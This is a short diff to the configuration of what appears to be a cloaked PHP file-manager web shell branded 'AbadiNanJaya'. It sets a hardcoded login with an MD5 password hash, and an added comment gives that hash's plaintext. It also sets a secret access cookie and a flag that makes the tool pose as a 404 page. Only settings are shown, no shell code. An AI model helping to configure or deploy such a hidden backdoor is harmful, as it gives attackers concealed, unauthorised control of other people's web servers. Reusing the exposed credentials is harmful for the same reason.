@@ -290,9 +290,9 @@ define('FM_EDIT_MAX', 2 * 1024 * 1024);
  */
 define('FM_AUTH_MODE', 'userpass');
 define('FM_AUTH_USER', 'abadinanjaya');
-define('FM_AUTH_PASS', 'f6b87c765ba9194e7e664597f5c3f50f');
+define('FM_AUTH_PASS', 'f6b87c765ba9194e7e664597f5c3f50f'); // MD5(abadinanjayateam)
 define('FM_COOKIE_NAME', 'abadinanjaya');
-define('FM_COOKIE_VALUE', 'kontol');
+define('FM_COOKIE_VALUE', 'abadinanjayateam');
 define('FM_CLOAK_404', true);
 define('FM_SHOW_LOGIN_ON_404', false);
 define('FM_ICON_URL', 'https://raw.githubusercontent.com/BlackNovaHub/AbadiNanJaya/refs/heads/main/icon.png');
